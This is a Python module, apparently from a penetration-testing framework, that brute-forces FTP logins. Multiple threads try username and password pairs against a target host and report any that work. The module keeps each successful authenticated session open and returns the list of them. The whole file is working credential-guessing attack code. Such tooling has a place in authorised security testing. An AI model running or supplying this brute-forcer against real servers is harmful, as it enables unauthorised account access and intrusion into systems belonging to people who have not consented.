from jframework.modules.login._bruteforce import _Bruteforce
import ftplib
import sys
import threading

class Ftpbruteforce(_Bruteforce):

    def __init__(self):
        super(Ftpbruteforce, self).__init__()
        self.lock = threading.Lock()
        self.sessions = []


    def worker(self, user, password):
        size = int(self.num_options / self.maxthreads)

        ftp = ftplib.FTP()
        ftp.connect(self.HOST, timeout=7)
        try:
            ftp.login(user, password)
            self.print_result(user, password, error=False)
            self.lock.acquire()
            self.sessions.append({"id": 0, "ip": self.HOST, "session": ftp, "user": user, "type": "ftp"})
            self.lock.release()
            self.login_found += 1
        except:
            if self.verb:
                self.print_result(user, password, error=True)

            ftp.close()

        self.num_threads -= 1
        sys.exit(0)

    def run(self):
        ftp = ftplib.FTP()
        try:
            ftp.connect(self.HOST, timeout=7)
        except:
            print("{} Connection problem.".format(self.HOST))
            return
        ftp.close()
        self.sessions = []
        super(Ftpbruteforce, self).run()

        list_sessions = []

        for session in self.sessions:
            list_sessions.append(session)

        print(len(list_sessions), " sessions open")
        return list_sessions






